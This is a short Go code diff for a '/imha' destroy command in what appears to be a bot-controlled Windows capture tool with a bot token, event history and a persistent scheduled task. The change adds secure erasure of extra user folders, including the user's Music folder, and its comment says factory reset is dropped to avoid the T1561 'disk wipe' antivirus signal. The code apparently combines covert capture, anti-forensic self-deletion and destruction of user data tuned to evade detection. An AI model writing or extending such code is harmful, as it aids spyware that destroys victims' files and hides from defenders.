@@ -8,12 +8,13 @@ import (
 
 // destroyPlan is the input to the /imha sweep. SecureFiles are overwritten with
 // random data before deletion (so the bot token and event history can't be
-// recovered); then the scheduled task is removed and a Windows factory reset is
-// triggered to wipe the rest of the device — the legitimate "remote wipe" of the
-// Find My / MDM class.
+// recovered). WipeDirs' CONTENTS are securely erased too (the user's Music folder
+// is added by the helper itself). There is NO factory reset — this keeps the OS
+// intact and avoids the T1561 "disk wipe" AV signal.
 type destroyPlan struct {
 	SecureFiles []string // overwrite-then-delete (config, DB + side files, log)
 	Dirs        []string // capture output dirs (plain recursive delete)
+	WipeDirs    []string // extra user dirs whose contents are securely erased
 	Task        string   // scheduled task to remove
 	Exe         string   // the running executable
 }
@@ -45,6 +46,7 @@ func (a *App) destroy(_ context.Context) error {
 	plan := destroyPlan{
 		SecureFiles: a.secureFiles(),
 		Dirs:        a.captureDirs(),
+		WipeDirs:    a.cfg.WipeTargets(),
 		Task:        scheduledTaskName,
 		Exe:         exe,
 	}
